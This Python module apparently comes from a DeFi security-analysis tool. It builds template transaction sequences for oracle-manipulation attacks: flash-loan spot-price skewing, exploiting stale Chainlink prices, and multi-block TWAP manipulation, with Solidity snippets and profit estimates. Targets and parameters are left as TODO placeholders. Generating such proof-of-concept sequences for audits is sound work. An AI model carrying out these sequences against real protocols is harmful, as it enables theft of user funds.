"""
OracleManipulationSequenceBuilder — Phase 4.

Converts ORACLE_MANIPULATION hypotheses into transaction sequences.

Handles:
  - Single-block spot price manipulation (getReserves/slot0)
  - Stale Chainlink price exploitation
  - TWAP window manipulation (multi-block)
"""

from __future__ import annotations

from zeropath.adversarial.models import AttackClass, AttackHypothesis, ConditionType
from zeropath.models import ProtocolGraph
from zeropath.sequencer.base import FLASH_LOAN_PROVIDERS, BaseSequenceBuilder
from zeropath.sequencer.models import (
    AttackContext,
    CallerType,
    ProfitEstimate,
    TxCall,
)

_AAVE_V3 = FLASH_LOAN_PROVIDERS["aave_v3"]


class OracleManipulationSequenceBuilder(BaseSequenceBuilder):
    """Builds transaction sequences for oracle manipulation attacks."""

    attack_class = AttackClass.ORACLE_MANIPULATION

    def _build_calls(
        self,
        hypothesis: AttackHypothesis,
        graph: ProtocolGraph,
    ) -> list[TxCall]:
        title_lower = hypothesis.title.lower()

        if "stale" in title_lower or "chainlink" in title_lower:
            return self._stale_oracle_sequence(hypothesis)
        if "twap" in title_lower:
            return self._twap_manipulation_sequence(hypothesis)
        return self._spot_price_sequence(hypothesis)

    def _spot_price_sequence(self, hypothesis: AttackHypothesis) -> list[TxCall]:
        target_contract = (hypothesis.contracts_involved or ["LendingPool"])[0]
        target_fn = (hypothesis.functions_involved or ["borrow"])[0]
        oracle_dep = hypothesis.oracle_dependencies[0] if hypothesis.oracle_dependencies else None
        oracle_contract = oracle_dep.oracle_contract if oracle_dep else "IUniswapV2Pair"
        read_fn = oracle_dep.read_function if oracle_dep else "getReserves"

        return [
            self._call(
                step=1,
                description="Request large flash loan to fund oracle manipulation",
                target=f"IPool({_AAVE_V3})",
                sig="flashLoan(address,address[],uint256[],uint256[],address,bytes,uint16)",
                calldata="address(this), assets, amounts, modes, address(this), params, 0",
                caller=CallerType.ATTACKER_CONTRACT,
                pre=[
                    "uint256 attackerEthBefore = address(this).balance;",
                    f"// Record oracle price before manipulation",
                    f"(uint112 r0Before, uint112 r1Before,) = I{oracle_contract}(ORACLE).getReserves();",
                ],
                gas=600_000,
            ),
            self._call(
                step=2,
                description=f"[In executeOperation] Swap flash-loaned funds into {oracle_contract} — skew {read_fn}",
                target=f"I{oracle_contract}(/* oracle pool address */)",
                sig="swap(uint256,uint256,address,bytes)",
                calldata="flashAmount, 0, address(this), ''",
                caller=CallerType.ATTACKER_CONTRACT,
                post=[
                    f"// Verify oracle price has moved significantly",
                    f"(uint112 r0After, uint112 r1After,) = I{oracle_contract}(ORACLE).getReserves();",
                    "assertGt(r0After, r0Before * 2, 'Oracle not sufficiently manipulated');",
                ],
                gas=300_000,
            ),
            self._call(
                step=3,
                description=f"[In executeOperation] Call {target_fn}() while oracle reads manipulated price",
                target=f"I{target_contract}(/* {target_contract} address */)",
                sig=f"{target_fn}(/* TODO: params */)",
                calldata="/* TODO: borrow/withdraw params */",
                caller=CallerType.ATTACKER_CONTRACT,
                post=[
                    f"// {target_fn} used manipulated price — extracted excess value",
                ],
                gas=400_000,
            ),
            self._call(
                step=4,
                description=f"[In executeOperation] Reverse swap to restore {oracle_contract} reserves",
                target=f"I{oracle_contract}(/* oracle pool address */)",
                sig="swap(uint256,uint256,address,bytes)",
                calldata="0, amountOut, address(this), ''",
                caller=CallerType.ATTACKER_CONTRACT,
                gas=200_000,
            ),
            self._call(
                step=5,
                description="Repay flash loan principal + 0.09% fee",
                target=f"IERC20(FLASH_TOKEN)",
                sig="transfer(address,uint256)",
                calldata=f"address({_AAVE_V3}), flashAmount + flashFee",
                caller=CallerType.ATTACKER_CONTRACT,
                post=[
                    "uint256 attackerEthAfter = address(this).balance;",
                    "assertGt(attackerEthAfter, attackerEthBefore, 'Oracle attack not profitable');",
                ],
                gas=80_000,
            ),
        ]

    def _stale_oracle_sequence(self, hypothesis: AttackHypothesis) -> list[TxCall]:
        target_contract = (hypothesis.contracts_involved or ["LendingPool"])[0]
        target_fn = (hypothesis.functions_involved or ["liquidate"])[0]

        return [
            self._call(
                step=1,
                description="Verify Chainlink oracle is stale (updatedAt + heartbeat < block.timestamp)",
                target="IAggregatorV3(/* Chainlink aggregator address */)",
                sig="latestRoundData()",
                calldata="",
                caller=CallerType.ATTACKER_EOA,
                pre=[
                    "(, int256 price,, uint256 updatedAt,) = oracle.latestRoundData();",
                    "require(block.timestamp - updatedAt > 3600, 'Oracle not stale yet');",
                ],
                gas=30_000,
            ),
            self._call(
                step=2,
                description=f"Call {target_fn}() while oracle reports stale price",
                target=f"I{target_contract}(/* {target_contract} address */)",
                sig=f"{target_fn}(/* TODO: params */)",
                calldata="/* TODO: specify target position/borrower */",
                caller=CallerType.ATTACKER_EOA,
                post=[
                    "// Stale price created profitable liquidation opportunity",
                    "assertGt(IERC20(COLLATERAL_TOKEN).balanceOf(address(this)), 0, 'Stale oracle not exploited');",
                ],
                gas=300_000,
            ),
        ]

    def _twap_manipulation_sequence(self, hypothesis: AttackHypothesis) -> list[TxCall]:
        oracle_dep = hypothesis.oracle_dependencies[0] if hypothesis.oracle_dependencies else None
        oracle_contract = oracle_dep.oracle_contract if oracle_dep else "UniswapOracleV2"

        return [
            self._call(
                step=1,
                description="[Block N] Begin sustained buy pressure to move TWAP",
                target="/* AMM pool */",
                sig="swap(uint256,uint256,address,bytes)",
                calldata="largeAmount, 0, address(this), ''",
                caller=CallerType.ATTACKER_EOA,
                pre=[
                    "// WARNING: TWAP manipulation is NOT atomic",
                    "// This sequence spans multiple blocks over the TWAP window",
                    f"// TWAP window: check I{oracle_contract}.PERIOD()",
                ],
                gas=300_000,
            ),
            self._call(
                step=2,
                description="[Blocks N+1 to N+K] Maintain buy pressure throughout TWAP window",
                target="/* AMM pool */",
                sig="swap(uint256,uint256,address,bytes)",
                calldata="largeAmount, 0, address(this), ''",
                caller=CallerType.ATTACKER_EOA,
                post=[
                    "// Repeat each block until TWAP window elapses",
                    f"I{oracle_contract}(ORACLE).update();  // trigger TWAP accumulator update",
                ],
                gas=300_000,
            ),
            self._call(
                step=3,
                description="[After TWAP window] Call vulnerable function with manipulated TWAP price",
                target=f"I{(hypothesis.contracts_involved or ['Target'])[0]}(/* target address */)",
                sig=f"{(hypothesis.functions_involved or ['borrow'])[0]}(/* params */)",
                calldata="/* TODO: params */",
                caller=CallerType.ATTACKER_EOA,
                post=[
                    "assertGt(address(this).balance, 0, 'TWAP manipulation not profitable');",
                ],
                gas=400_000,
            ),
        ]

    def _build_context(self, hypothesis, graph) -> AttackContext:
        ctx = super()._build_context(hypothesis, graph)
        ctx.requires_attacker_contract = True
        ctx.flash_loan_provider = _AAVE_V3
        ctx.requires_single_block = "twap" not in hypothesis.title.lower()
        return ctx

    def _build_profit_estimate(self, hypothesis) -> ProfitEstimate | None:
        return ProfitEstimate(
            asset="ERC20",
            min_profit_expression="1e18",
            max_profit_expression="IERC20(BORROWED_TOKEN).totalSupply()",
            cost_expression="(flashAmount * 9) / 10000",
            scales_with_tvl=True,
            notes="Profit from oracle manipulation = borrow at inflated price - true collateral value - flash fee.",
        )
